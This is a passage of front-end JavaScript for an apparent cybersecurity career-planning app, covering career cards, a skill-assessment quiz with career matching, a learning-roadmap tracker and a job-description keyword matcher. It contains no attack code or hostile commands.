              <div class="rec-item-title">${r.title}</div>
              <div class="rec-item-sub">${r.sub}</div>
            </div>
          </div>
          <button class="btn btn-sm btn-outline" onclick="app.navigateTo('${r.view}')">${r.actionLabel} &rarr;</button>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  getNextUncompletedTopic() {
    for (const mod of ROADMAP_MODULES) {
      for (const topic of mod.topics) {
        if (!this.state.data.completedRoadmapTopics.includes(topic.id)) {
          return { ...topic, moduleTitle: mod.title };
        }
      }
    }
    return null;
  }

  // -----------------------------------------------------------------
  // 3.4 Career Explorer Rendering
  // -----------------------------------------------------------------
  renderCareers(filter = 'all', searchQuery = '') {
    const container = document.getElementById('careers-cards-container');
    if (!container) return;

    // Category filter tabs
    const filterTabs = document.querySelectorAll('.filter-tab[data-filter]');
    filterTabs.forEach(tab => {
      tab.onclick = () => {
        filterTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        this.renderCareers(tab.getAttribute('data-filter'), searchQuery);
      };
    });

    // Search filter input
    const searchInput = document.getElementById('career-filter-input');
    if (searchInput) {
      searchInput.oninput = (e) => {
        this.renderCareers(filter, e.target.value.toLowerCase().trim());
      };
    }

    const filtered = CAREERS_DATA.filter(role => {
      const matchesCategory = (filter === 'all') || (role.category === filter);
      const q = searchQuery.toLowerCase();
      const matchesSearch = !q || (
        role.title.toLowerCase().includes(q) ||
        role.shortDesc.toLowerCase().includes(q) ||
        role.skills.some(s => s.toLowerCase().includes(q)) ||
        role.certifications.some(c => c.toLowerCase().includes(q))
      );
      return matchesCategory && matchesSearch;
    });

    if (filtered.length === 0) {
      container.innerHTML = `
        <div style="grid-column: 1/-1; padding: 2rem; text-align: center; color: var(--text-muted);">
          No career specializations match your filter criteria. Try searching for "SOC", "Cloud", or "Linux".
        </div>
      `;
      return;
    }

    let html = '';
    filtered.forEach(role => {
      const isTarget = this.state.data.targetRoleId === role.id;
      html += `
        <article class="career-card" data-role-id="${role.id}">
          <div class="career-card-top">
            <div class="career-card-header">
              <span class="career-domain-tag">${role.categoryLabel}</span>
              ${isTarget ? '<span class="career-target-indicator">★ TARGET CAREER</span>' : ''}
            </div>
            <h3 class="career-card-title">${role.title}</h3>
            <p class="career-card-desc">${role.shortDesc}</p>

            <div class="career-meta-section">
              <div class="career-meta-label">Required Technical Skills:</div>
              <div class="career-skills-wrap">
                ${role.skills.map(s => `<span class="skill-tag">${s}</span>`).join('')}
              </div>
            </div>

            <div class="career-meta-section">
              <div class="career-meta-label">Recommended Certifications:</div>
              <div class="career-cert-tags">
                ${role.certifications.map(c => `<span class="cert-tag">${c}</span>`).join('')}
              </div>
            </div>
          </div>

          <div class="career-card-footer">
            <button class="btn btn-sm btn-primary" onclick="app.openCareerModal('${role.id}')">
              Explore Career &rarr;
            </button>
            <button class="btn btn-sm ${isTarget ? 'btn-secondary' : 'btn-outline'}" onclick="app.setTargetCareer('${role.id}')">
              ${isTarget ? 'Active Target' : 'Set as Target'}
            </button>
          </div>
        </article>
      `;
    });

    container.innerHTML = html;
  }

  openCareerModal(roleId) {
    const role = CAREERS_DATA.find(c => c.id === roleId);
    if (!role) return;

    const modal = document.getElementById('career-modal');
    const categoryEl = document.getElementById('modal-career-category');
    const titleEl = document.getElementById('modal-career-title');
    const contentEl = document.getElementById('modal-career-content');
    const targetBtn = document.getElementById('modal-set-target-btn');

    if (categoryEl) categoryEl.textContent = role.categoryLabel;
    if (titleEl) titleEl.textContent = role.title;
    if (targetBtn) {
      targetBtn.onclick = () => {
        this.setTargetCareer(role.id);
        this.closeCareerModal();
      };
    }

    if (contentEl) {
      contentEl.innerHTML = `
        <div style="margin-bottom: 1.25rem;">
          <h4 style="font-size: 1.05rem; font-weight: 700; color: var(--accent-cyan); margin-bottom: 0.35rem;">Role Overview</h4>
          <p style="color: var(--text-secondary);">${role.shortDesc}</p>
        </div>

        <div style="margin-bottom: 1.25rem;">
          <h4 style="font-size: 1.05rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.5rem;">Typical Core Responsibilities</h4>
          <ul style="padding-left: 1.25rem; color: var(--text-secondary); display: flex; flex-direction: column; gap: 0.4rem;">
            ${role.responsibilities.map(r => `<li>${r}</li>`).join('')}
          </ul>
        </div>

        <div style="margin-bottom: 1.25rem; background: var(--bg-surface); border-left: 3px solid var(--accent-cyan); padding: 0.85rem 1rem; border-radius: 4px;">
          <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.35rem;">A Day in the Life</h4>
          <p style="font-size: 0.86rem; color: var(--text-secondary); line-height: 1.5;">${role.dayInLife}</p>
        </div>

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.25rem;">
          <div>
            <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.4rem;">Core Toolchain</h4>
            <div style="display: flex; flex-wrap: wrap; gap: 0.35rem;">
              ${role.tools.map(t => `<span class="skill-tag">${t}</span>`).join('')}
            </div>
          </div>
          <div>
            <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.4rem;">Recommended Certifications</h4>
            <div style="display: flex; flex-wrap: wrap; gap: 0.35rem;">
              ${role.certifications.map(c => `<span class="cert-tag">${c}</span>`).join('')}
            </div>
          </div>
        </div>

        <div style="margin-bottom: 1.25rem;">
          <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.4rem;">Curated Free Learning Resources</h4>
          <div style="display: flex; flex-direction: column; gap: 0.45rem;">
            ${role.resources.map(res => `
              <div style="display: flex; align-items: center; justify-content: space-between; padding: 0.4rem 0.75rem; background: var(--bg-card); border-radius: 4px;">
                <span style="font-size: 0.84rem; color: var(--text-secondary);">${res.name}</span>
                <a href="${res.url}" target="_blank" rel="noopener noreferrer" class="btn-text-link">Open &rarr;</a>
              </div>
            `).join('')}
          </div>
        </div>

        <div style="padding: 0.75rem; background: var(--bg-elevated); border: 1px dashed var(--border-light); border-radius: 4px; font-size: 0.78rem; color: var(--text-muted);">
          <strong>Transparency Notice:</strong> ${role.salaryBenchmark}. Compensation figures are strictly illustrative industry averages and do not represent guaranteed offers.
        </div>
      `;
    }

    if (modal) modal.classList.remove('hidden');
  }

  closeCareerModal() {
    const modal = document.getElementById('career-modal');
    if (modal) modal.classList.add('hidden');
  }

  setTargetCareer(roleId) {
    this.state.data.targetRoleId = roleId;
    this.state.save();
    this.renderSidebar();
    this.renderCareers();
    const role = CAREERS_DATA.find(c => c.id === roleId);
    this.showToast(`Set ${role ? role.title : 'Role'} as target pathway`, 'success');
  }

  calculateRoleReadiness(roleId) {
    const totalTopics = ROADMAP_MODULES.reduce((acc, m) => acc + m.topics.length, 0);
    const completed = this.state.data.completedRoadmapTopics.length;
    const roadmapScore = (completed / totalTopics) * 50;
    const assessScore = this.state.data.assessment?.completed ? (this.state.data.assessment.percent * 0.4) : 25;
    return Math.min(Math.round(roadmapScore + assessScore + 10), 100);
  }

  // -----------------------------------------------------------------
  // 3.5 Skill Assessment Logic & Career Matcher
  // -----------------------------------------------------------------
  renderQuizQuestion(index) {
    if (index < 0 || index >= ASSESSMENT_QUESTIONS.length) return;
    this.currentQuizIndex = index;

    const q = ASSESSMENT_QUESTIONS[index];
    const quizContainer = document.getElementById('assessment-quiz-container');
    const resultsContainer = document.getElementById('assessment-results-container');
    if (quizContainer) quizContainer.classList.remove('hidden');
    if (resultsContainer) resultsContainer.classList.add('hidden');

    // Update Header Labels
    const currentQEl = document.getElementById('current-q-index');
    const totalQEl = document.getElementById('total-q-count');
    const categoryEl = document.getElementById('current-q-category');
    const progressBar = document.getElementById('quiz-progress-bar');
    const qNumberPill = document.getElementById('q-number-pill');

    if (currentQEl) currentQEl.textContent = index + 1;
    if (totalQEl) totalQEl.textContent = ASSESSMENT_QUESTIONS.length;
    if (categoryEl) categoryEl.textContent = q.domainLabel;
    if (qNumberPill) qNumberPill.textContent = `Question ${index + 1} of ${ASSESSMENT_QUESTIONS.length}`;

    const pct = Math.round(((index + 1) / ASSESSMENT_QUESTIONS.length) * 100);
    if (progressBar) progressBar.style.width = `${pct}%`;

    // Question content
    const qTextEl = document.getElementById('q-text');
    const qScenarioEl = document.getElementById('q-scenario');
    if (qTextEl) qTextEl.textContent = q.text;
    if (qScenarioEl) qScenarioEl.textContent = q.scenario;

    // Render Choices
    const choicesContainer = document.getElementById('q-choices-container');
    if (choicesContainer) {
      let choicesHtml = '';
      q.choices.forEach((choice, cIndex) => {
        const isSelected = this.currentQuizAnswers[q.id] === cIndex;
        choicesHtml += `
          <label class="choice-label ${isSelected ? 'selected' : ''}" onclick="app.selectQuizChoice(${q.id}, ${cIndex})">
            <input type="radio" name="quiz_choice_${q.id}" class="choice-radio" value="${cIndex}" ${isSelected ? 'checked' : ''}>
            <span class="choice-text">${choice}</span>
          </label>
        `;
      });
      choicesContainer.innerHTML = choicesHtml;
    }

    // Controls
    const prevBtn = document.getElementById('quiz-prev-btn');
    const nextBtn = document.getElementById('quiz-next-btn');
    if (prevBtn) prevBtn.disabled = index === 0;

    const isLast = index === ASSESSMENT_QUESTIONS.length - 1;
    if (nextBtn) {
      nextBtn.innerHTML = isLast ? 'Submit Diagnostic &rarr;' : 'Next Question &rarr;';
    }

    // Step dots
    this.renderQuizDots();
  }

  renderQuizDots() {
    const dotsContainer = document.getElementById('quiz-dots-container');
    if (!dotsContainer) return;

    let html = '';
    ASSESSMENT_QUESTIONS.forEach((q, idx) => {
      const isAnswered = this.currentQuizAnswers[q.id] !== undefined;
      const isActive = idx === this.currentQuizIndex;
      let classes = 'dot-step';
      if (isActive) classes += ' active';
      else if (isAnswered) classes += ' answered';

      html += `<div class="${classes}" title="Question ${idx + 1}" onclick="app.renderQuizQuestion(${idx})"></div>`;
    });
    dotsContainer.innerHTML = html;
  }

  selectQuizChoice(questionId, choiceIndex) {
    this.currentQuizAnswers[questionId] = choiceIndex;
    
    // Update visual radio selection
    const labels = document.querySelectorAll('.choice-label');
    labels.forEach((l, idx) => {
      if (idx === choiceIndex) {
        l.classList.add('selected');
        const radio = l.querySelector('input[type="radio"]');
        if (radio) radio.checked = true;
      } else {
        l.classList.remove('selected');
      }
    });

    this.renderQuizDots();
  }

  nextQuestion() {
    if (this.currentQuizIndex < ASSESSMENT_QUESTIONS.length - 1) {
      this.renderQuizQuestion(this.currentQuizIndex + 1);
    } else {
      this.submitAssessment();
    }
  }

  prevQuestion() {
    if (this.currentQuizIndex > 0) {
      this.renderQuizQuestion(this.currentQuizIndex - 1);
    }
  }

  submitAssessment() {
    // Check how many answered
    let correctCount = 0;
    const domainScores = {
      networking: { correct: 0, total: 0 },
      linux: { correct: 0, total: 0 },
      python: { correct: 0, total: 0 },
      fundamentals: { correct: 0, total: 0 },
      web: { correct: 0, total: 0 },
      cloud: { correct: 0, total: 0 }
    };

    ASSESSMENT_QUESTIONS.forEach(q => {
      domainScores[q.domain].total++;
      if (this.currentQuizAnswers[q.id] === q.correctIndex) {
        correctCount++;
        domainScores[q.domain].correct++;
      }
    });

    const totalCount = ASSESSMENT_QUESTIONS.length;
    const percent = Math.round((correctCount / totalCount) * 100);

    let tier = 'Novice';
    if (percent >= 90) tier = 'Specialist (Tier 4)';
    else if (percent >= 70) tier = 'Practitioner (Tier 3)';
    else if (percent >= 50) tier = 'Apprentice (Tier 2)';
    else tier = 'Novice (Tier 1)';

    const resultObj = {
      completed: true,
      answers: { ...this.currentQuizAnswers },
      score: correctCount,
      total: totalCount,
      percent: percent,
      tier: tier,
      domainScores: domainScores,
      date: new Date().toISOString()
    };

    this.state.data.assessment = resultObj;
    this.state.save();

    this.displayAssessmentResults(resultObj);
    this.renderDashboard();
    this.renderSidebar();
    this.showToast('Diagnostic assessment completed!', 'success');
  }

  displayAssessmentResults(res) {
    const quizContainer = document.getElementById('assessment-quiz-container');
    const resultsContainer = document.getElementById('assessment-results-container');
    if (quizContainer) quizContainer.classList.add('hidden');
    if (resultsContainer) resultsContainer.classList.remove('hidden');

    const scoreEl = document.getElementById('results-overall-score');
    const scoreDetailEl = document.getElementById('results-score-detail');
    const tierBadgeEl = document.getElementById('results-tier-badge');
    const summaryText = document.getElementById('results-summary-text');

    if (scoreEl) scoreEl.textContent = `${res.percent}%`;
    if (scoreDetailEl) scoreDetailEl.textContent = `${res.score} of ${res.total} Correct`;
    if (tierBadgeEl) tierBadgeEl.textContent = res.tier;
    if (summaryText) {
      summaryText.textContent = `You performed in the ${res.tier} range across 6 core cybersecurity pillars. Review strengths and recommended pathways below.`;
    }

    // Strengths & Improvements Lists
    this.generateStrengthsAndImprovements(res);

    // Matched Careers Ranking
    this.renderMatchedCareers(res);

    // Domain Breakdown
    this.renderDomainMasteryBars('results-domain-breakdown');

    // Prepare Review Section
    this.renderQuizAnswerReview();
  }

  generateStrengthsAndImprovements(res) {
    const strengthsList = document.getElementById('results-strengths-list');
    const improvementsList = document.getElementById('results-improvements-list');
    if (!strengthsList || !improvementsList) return;

    const domains = [
      { id: 'networking', label: 'Computer Networking (TCP/IP, DNS, Subnets)' },
      { id: 'linux', label: 'Linux OS & Command-Line Log Investigation' },
      { id: 'python', label: 'Python Automation & Threat Parsing' },
      { id: 'fundamentals', label: 'Cybersecurity Fundamentals & Cryptography' },
      { id: 'web', label: 'Web Application Security & OWASP Top 10' },
      { id: 'cloud', label: 'Cloud Architecture & IAM Least Privilege' }
    ];

    const answers = res.answers || {};
    const strengths = [];
    const improvements = [];

    domains.forEach(d => {
      const qList = ASSESSMENT_QUESTIONS.filter(q => q.domain === d.id);
      let correct = 0;
      qList.forEach(q => {
        if (answers[q.id] === q.correctIndex) correct++;
      });
      const pct = (correct / qList.length) * 100;
      if (pct >= 66) {
        strengths.push(`Solid grasp of ${d.label} (${correct}/${qList.length} correct).`);
      } else {
        improvements.push(`Deepen practical lab practice in ${d.label} (${correct}/${qList.length} correct).`);
      }
    });

    if (strengths.length === 0) {
      strengths.push('Great starting baseline! Systematic practice will quickly boost diagnostic scores.');
    }
    if (improvements.length === 0) {
      improvements.push('Outstanding comprehensive baseline! Focus on building high-impact portfolio labs.');
    }

    strengthsList.innerHTML = strengths.map(s => `<li>${s}</li>`).join('');
    improvementsList.innerHTML = improvements.map(i => `<li>${i}</li>`).join('');
  }

  renderMatchedCareers(res) {
    const container = document.getElementById('results-matched-roles-container');
    if (!container) return;

    // Career matching formula based on domain scores
    const answers = res.answers || {};
    const getDomainScore = (dom) => {
      const qList = ASSESSMENT_QUESTIONS.filter(q => q.domain === dom);
      let c = 0;
      qList.forEach(q => { if (answers[q.id] === q.correctIndex) c++; });
      return c / qList.length;
    };

    const netScore = getDomainScore('networking');
    const linScore = getDomainScore('linux');
    const pyScore = getDomainScore('python');
    const fundScore = getDomainScore('fundamentals');
    const webScore = getDomainScore('web');
    const cloudScore = getDomainScore('cloud');

    const roleRankings = [
      {
        id: 'soc',
        title: 'SOC Analyst',
        score: Math.round(((netScore * 0.3) + (linScore * 0.3) + (fundScore * 0.4)) * 100),
        reason: 'High synergy between network traffic analysis, Linux logs, and defense fundamentals.'
      },
      {
        id: 'pentest',
        title: 'Penetration Tester',
        score: Math.round(((webScore * 0.4) + (linScore * 0.3) + (pyScore * 0.3)) * 100),
        reason: 'Strong performance in web application vulnerabilities and scripting capability.'
      },
      {
        id: 'cloud-sec',
        title: 'Cloud Security Engineer',
        score: Math.round(((cloudScore * 0.5) + (netScore * 0.3) + (linScore * 0.2)) * 100),
        reason: 'Strong aptitude for cloud IAM boundaries and modern infrastructure protection.'
      },
      {
        id: 'incident-responder',
        title: 'Incident Responder',
        score: Math.round(((fundScore * 0.35) + (linScore * 0.35) + (netScore * 0.3)) * 100),
        reason: 'Well suited for emergency triage, timeline reconstruction, and containment.'
      }
    ].sort((a, b) => b.score - a.score);

    let html = '';
    roleRankings.forEach((r, idx) => {
      const isTop = idx === 0;
      html += `
        <div class="matched-role-card ${isTop ? 'top-rank' : ''}">
          <div class="match-role-header">
            <span class="match-role-title">${r.title} ${isTop ? '★ Top Match' : ''}</span>
            <span class="match-role-score">${r.score}% Match</span>
          </div>
          <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 0.65rem;">${r.reason}</p>
          <button class="btn btn-sm ${isTop ? 'btn-primary' : 'btn-outline'}" onclick="app.setTargetCareer('${r.id}')">
            Set as Target &rarr;
          </button>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  renderQuizAnswerReview() {
    const container = document.getElementById('quiz-review-items');
    if (!container) return;

    const answers = this.state.data.assessment?.answers || {};
    let html = '';

    ASSESSMENT_QUESTIONS.forEach((q, idx) => {
      const userChoice = answers[q.id];
      const isCorrect = userChoice === q.correctIndex;
      const userChoiceText = userChoice !== undefined ? q.choices[userChoice] : 'Unanswered';
      const correctChoiceText = q.choices[q.correctIndex];

      html += `
        <div class="review-item ${isCorrect ? 'correct' : 'incorrect'}">
          <div style="display: flex; justify-content: space-between; margin-bottom: 0.35rem;">
            <span style="font-family: var(--font-mono); font-size: 0.72rem; color: var(--accent-cyan); font-weight: 700;">
              Q${idx + 1} &bull; ${q.domainLabel}
            </span>
            <span style="font-size: 0.76rem; font-weight: 700; color: ${isCorrect ? 'var(--accent-green)' : 'var(--accent-red)'};">
              ${isCorrect ? '✓ Correct' : '✗ Incorrect'}
            </span>
          </div>
          <div class="review-item-q">${q.text}</div>
          <div style="font-size: 0.84rem; margin: 0.4rem 0;">
            <div style="color: ${isCorrect ? 'var(--accent-green)' : 'var(--accent-red)'};">
              <strong>Your Answer:</strong> ${userChoiceText}
            </div>
            ${!isCorrect ? `<div style="color: var(--accent-green); margin-top: 0.15rem;"><strong>Correct Answer:</strong> ${correctChoiceText}</div>` : ''}
          </div>
          <div class="review-item-explanation">
            <strong>Technical Explanation:</strong> ${q.explanation}
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  toggleQuizAnswerReview() {
    const reviewBox = document.getElementById('quiz-review-section');
    const toggleBtn = document.getElementById('toggle-quiz-review-btn');
    if (!reviewBox) return;

    const isHidden = reviewBox.classList.contains('hidden');
    if (isHidden) {
      reviewBox.classList.remove('hidden');
      if (toggleBtn) toggleBtn.textContent = 'Hide Answer Explanations';
      reviewBox.scrollIntoView({ behavior: 'smooth' });
    } else {
      reviewBox.classList.add('hidden');
      if (toggleBtn) toggleBtn.textContent = 'Review All Question Explanations';
    }
  }

  retakeAssessment() {
    this.currentQuizAnswers = {};
    this.renderQuizQuestion(0);
  }

  // -----------------------------------------------------------------
  // 3.6 Learning Roadmap Logic
  // -----------------------------------------------------------------
  renderRoadmap() {
    const container = document.getElementById('roadmap-modules-container');
    if (!container) return;

    const completed = this.state.data.completedRoadmapTopics;
    const totalTopics = ROADMAP_MODULES.reduce((acc, m) => acc + m.topics.length, 0);
    const overallPct = Math.round((completed.length / totalTopics) * 100);

    // Summary banner
    const bigPercentEl = document.getElementById('roadmap-big-percent');
    const bigBarEl = document.getElementById('roadmap-big-bar');
    const topicsLabel = document.getElementById('roadmap-topics-completed-label');
    const nextLessonEl = document.getElementById('roadmap-next-lesson-banner');

    if (bigPercentEl) bigPercentEl.textContent = `${overallPct}% COMPLETED`;
    if (bigBarEl) bigBarEl.style.width = `${overallPct}%`;
    if (topicsLabel) topicsLabel.textContent = `${completed.length} of ${totalTopics} topics checked off`;

    const nextTopic = this.getNextUncompletedTopic();
    if (nextLessonEl) {
      nextLessonEl.innerHTML = nextTopic 
        ? `Next: <strong>${nextTopic.title}</strong> (${nextTopic.moduleTitle})`
        : '🎉 <strong>All 9 Roadmap Modules Completed!</strong> Outstanding achievement.';
    }

    let html = '';
    ROADMAP_MODULES.forEach((mod, idx) => {
      const modCompletedCount = mod.topics.filter(t => completed.includes(t.id)).length;
      const modTotal = mod.topics.length;
      const modPct = Math.round((modCompletedCount / modTotal) * 100);
      const isComplete = modCompletedCount === modTotal;
      const isOpen = idx === 0 || (modCompletedCount > 0 && !isComplete);

      html += `
        <div class="roadmap-module-card ${isOpen ? 'open' : ''}" id="module-card-${mod.id}">
          <div class="module-header" onclick="app.toggleRoadmapModule('${mod.id}')">
            <div class="module-header-left">
              <div class="module-number-circle">${mod.num}</div>
              <div class="module-title-group">
                <h3>${mod.title}</h3>
                <p>${mod.desc}</p>
              </div>
            </div>
            <div class="module-header-right">
              <span class="module-progress-chip ${isComplete ? 'badge-pill green' : ''}">
                ${isComplete ? '✓ Complete' : `${modCompletedCount}/${modTotal} Topics`}
              </span>
              <svg class="module-toggle-chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="6 9 12 15 18 9"></polyline>
              </svg>
            </div>
          </div>

          <div class="module-body">
            <div class="module-topics-list">
              ${mod.topics.map(t => {
                const checked = completed.includes(t.id);
                return `
                  <div class="topic-item-row ${checked ? 'completed' : ''}">
                    <input type="checkbox" class="topic-checkbox" id="chk_${t.id}" ${checked ? 'checked' : ''} onchange="app.toggleRoadmapTopic('${t.id}')">
                    <div class="topic-content">
                      <label for="chk_${t.id}" class="topic-label">${t.title}</label>
                      <span class="topic-desc">${t.desc}</span>
                    </div>
                  </div>
                `;
              }).join('')}
            </div>

            <div class="module-resources-row">
              <span class="resources-label">CURATED RESOURCES:</span>
              ${mod.resources.map(r => `
                <a href="${r.url}" target="_blank" rel="noopener noreferrer" class="resource-chip-link">
                  ${r.name} &nearr;
                </a>
              `).join('')}
            </div>
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
    this.updateNavRoadmapProgress();
  }

  toggleRoadmapModule(moduleId) {
    const card = document.getElementById(`module-card-${moduleId}`);
    if (card) {
      card.classList.toggle('open');
    }
  }

  toggleRoadmapTopic(topicId) {
    const list = this.state.data.completedRoadmapTopics;
    const index = list.indexOf(topicId);
    if (index > -1) {
      list.splice(index, 1);
    } else {
      list.push(topicId);
    }
    this.state.save();
    this.renderRoadmap();
    this.renderDashboard();
    this.renderSidebar();
  }

  markAllRoadmap(complete = true) {
    if (complete) {
      const all = [];
      ROADMAP_MODULES.forEach(m => m.topics.forEach(t => all.push(t.id)));
      this.state.data.completedRoadmapTopics = all;
      this.showToast('All 45 roadmap topics marked complete!', 'success');
    } else {
      this.state.data.completedRoadmapTopics = [];
      this.showToast('Roadmap progress reset.', 'info');
    }
    this.state.save();
    this.renderRoadmap();
    this.renderDashboard();
    this.renderSidebar();
  }

  resetRoadmap() {
    this.markAllRoadmap(false);
  }

  // -----------------------------------------------------------------
  // 3.7 Job & Internship Preparation Hub
  // -----------------------------------------------------------------
  renderJobPrep() {
    this.renderPortfolioProjects();
    this.renderInternshipChecklist();
  }

  loadJobSample(type) {
    const textarea = document.getElementById('job-desc-input');
    if (textarea && SAMPLE_JOB_POSTINGS[type]) {
      textarea.value = SAMPLE_JOB_POSTINGS[type];
      this.analyzeJobDescription();
    }
  }

  analyzeJobDescription() {
    const textarea = document.getElementById('job-desc-input');
    const resultsBox = document.getElementById('matcher-results-box');
    if (!textarea || !resultsBox) return;

    const text = textarea.value.toLowerCase().trim();
    if (!text) {
      this.showToast('Please paste a job description or select a sample preset first.', 'error');
      return;
    }

    // Extensive Cyber Skill Dictionary
    const SKILLS_DICT = [
      { key: 'splunk', label: 'Splunk' },
      { key: 'wazuh', label: 'Wazuh SIEM' },
      { key: 'siem', label: 'SIEM Log Correlation' },
      { key: 'wireshark', label: 'Wireshark Packet Analysis' },
      { key: 'tcp/ip', label: 'TCP/IP Networking' },
      { key: 'dns', label: 'DNS Protocol' },
      { key: 'linux', label: 'Linux Administration' },
      { key: 'bash', label: 'Bash Scripting' },
      { key: 'python', label: 'Python Automation' },
      { key: 'powershell', label: 'PowerShell' },
      { key: 'aws', label: 'AWS Cloud Security' },
      { key: 'azure', label: 'Azure Cloud Security' },
      { key: 'iam', label: 'IAM Architecture' },
      { key: 'terraform', label: 'Terraform (IaC)' },
      { key: 'docker', label: 'Docker' },
      { key: 'kubernetes', label: 'Kubernetes' },
      { key: 'burp suite', label: 'Burp Suite Pro' },
      { key: 'nmap', label: 'Nmap Scanning' },
      { key: 'metasploit', label: 'Metasploit' },
      { key: 'owasp', label: 'OWASP Top 10' },
      { key: 'mitre att&ck', label: 'MITRE ATT&CK' },
      { key: 'incident response', label: 'Incident Response' },
      { key: 'forensics', label: 'Digital Forensics' },
      { key: 'sysmon', label: 'Sysmon Telemetry' },
      { key: 'active directory', label: 'Active Directory' },
      { key: 'security+', label: 'CompTIA Security+' },
      { key: 'cysa+', label: 'CompTIA CySA+' },
      { key: 'pentest+', label: 'CompTIA PenTest+' },
      { key: 'oscp', label: 'OSCP' },
      { key: 'nist', label: 'NIST Framework' }
    ];

    const detectedSkills = [];
    SKILLS_DICT.forEach(item => {
      if (text.includes(item.key)) {
        detectedSkills.push(item.label);
      }
    });

    if (detectedSkills.length === 0) {
      this.showToast('No standard cybersecurity keywords recognized. Paste a more detailed technical job posting.', 'info');
      return;
    }

    // Match against user resume / roadmap
    const userResumeText = `${this.state.data.resume.skillsTools} ${this.state.data.resume.skillsOS} ${this.state.data.resume.skillsScripting} ${this.state.data.resume.certifications}`.toLowerCase();
    
    const matched = [];
    const missing = [];

    detectedSkills.forEach(skill => {
      const simple = skill.toLowerCase();
      if (userResumeText.includes(simple) || userResumeText.includes(simple.split(' ')[0])) {
        matched.push(skill);
      } else {
        missing.push(skill);
      }
    });

    const matchPct = Math.round((matched.length / detectedSkills.length) * 100);

    // Update UI elements
    const scorePctEl = document.getElementById('matcher-score-percent');
    const matchedCountEl = document.getElementById('matcher-matched-count');
    const missingCountEl = document.getElementById('matcher-missing-count');
    const matchedBadgesEl = document.getElementById('matcher-matched-badges');
    const missingBadgesEl = document.getElementById('matcher-missing-badges');
    const headingEl = document.getElementById('matcher-summary-heading');
    const descEl = document.getElementById('matcher-summary-desc');
    const recsEl = document.getElementById('matcher-gap-recommendations');

    if (scorePctEl) scorePctEl.textContent = `${matchPct}%`;
    if (matchedCountEl) matchedCountEl.textContent = matched.length;
    if (missingCountEl) missingCountEl.textContent = missing.length;

    if (matchedBadgesEl) {
      matchedBadgesEl.innerHTML = matched.length > 0 
        ? matched.map(m => `<span class="skill-match-pill matched">✓ ${m}</span>`).join('')
        : '<span class="text-sm text-muted">No directly matching skills detected yet.</span>';
    }

    if (missingBadgesEl) {
      missingBadgesEl.innerHTML = missing.length > 0
        ? missing.map(m => `<span class="skill-match-pill missing">✕ ${m}</span>`).join('')
        : '<span class="text-sm text-muted">Zero skill gaps found! 100% matched.</span>';
    }

    if (headingEl) {
      if (matchPct >= 80) headingEl.textContent = 'Excellent Profile Alignment (Tier 1 Fit)';
      else if (matchPct >= 60) headingEl.textContent = 'Competitive Candidate with Bridgeable Gaps';
      else headingEl.textContent = 'Foundational Candidate with Several Tooling Gaps';
    }

    if (descEl) {
      descEl.textContent = `You match ${matched.length} of ${detectedSkills.length} identified competencies. Bridging the ${missing.length} missing skills below will significantly increase interview callbacks.`;
    }

    if (recsEl) {
      if (missing.length === 0) {
        recsEl.innerHTML = '<div class="gap-step-row"><span>Ready to submit! Proceed to Resume Assistant to print your ATS draft.</span></div>';
      } else {
        recsEl.innerHTML = missing.slice(0, 4).map((m, i) => `
          <div class="gap-step-row">
            <span><strong>Step ${i + 1}:</strong> Complete lab module covering <strong>${m}</strong></span>
            <button class="btn btn-sm btn-text-link" onclick="app.navigateTo('roadmap')">View Roadmap &rarr;</button>
          </div>
        `).join('');
      }
    }

    resultsBox.classList.remove('hidden');
    resultsBox.scrollIntoView({ behavior: 'smooth' });
    this.showToast(`Analyzed ${detectedSkills.length} job skills: ${matchPct}% match!`, 'success');
  }

  renderPortfolioProjects() {
    const container = document.getElementById('project-blueprints-container');
    if (!container) return;

    let html = '';
    PORTFOLIO_PROJECTS.forEach(p => {
      html += `
        <div class="project-card">
          <div>
            <div class="project-tag">${p.tag}</div>
            <h4 class="project-title">${p.title}</h4>
            <p class="project-desc">${p.desc}</p>
            <div class="project-stack-wrap">
              ${p.stack.map(s => `<span class="skill-tag">${s}</span>`).join('')}
            </div>
          </div>
          <div>
            <button class="btn btn-sm btn-outline" onclick="app.openProjectBlueprintModal('${p.id}')">
              View Lab Blueprint & Bullets &rarr;
            </button>
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  openProjectBlueprintModal(projectId) {
    const p = PORTFOLIO_PROJECTS.find(item => item.id === projectId);
    if (!p) return;

    const modal = document.getElementById('career-modal');
    const categoryEl = document.getElementById('modal-career-category');
    const titleEl = document.getElementById('modal-career-title');
    const contentEl = document.getElementById('modal-career-content');
    const targetBtn = document.getElementById('modal-set-target-btn');

    if (categoryEl) categoryEl.textContent = `Portfolio Blueprint • ${p.tag}`;
    if (titleEl) titleEl.textContent = p.title;
    if (targetBtn) {
      targetBtn.textContent = 'Copy Resume Bullets';
      targetBtn.onclick = () => {
        const text = p.highlights.map(h => `• ${h}`).join('\n');
        navigator.clipboard.writeText(text);
        this.showToast('Copied project bullets to clipboard!', 'success');
        this.closeCareerModal();
      };
    }

    if (contentEl) {
      contentEl.innerHTML = `
        <div style="margin-bottom: 1.25rem;">
          <h4 style="font-size: 1.05rem; font-weight: 700; color: var(--accent-cyan); margin-bottom: 0.35rem;">Project Architecture Overview</h4>
          <p style="color: var(--text-secondary);">${p.desc}</p>
        </div>

        <div style="margin-bottom: 1.25rem;">
          <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-main); margin-bottom: 0.4rem;">Tech Stack & Tools</h4>
          <div style="display: flex; flex-wrap: wrap; gap: 0.4rem;">
            ${p.stack.map(s => `<span class="skill-tag">${s}</span>`).join('')}
          </div>
        </div>

        <div style="margin-bottom: 1.25rem;">
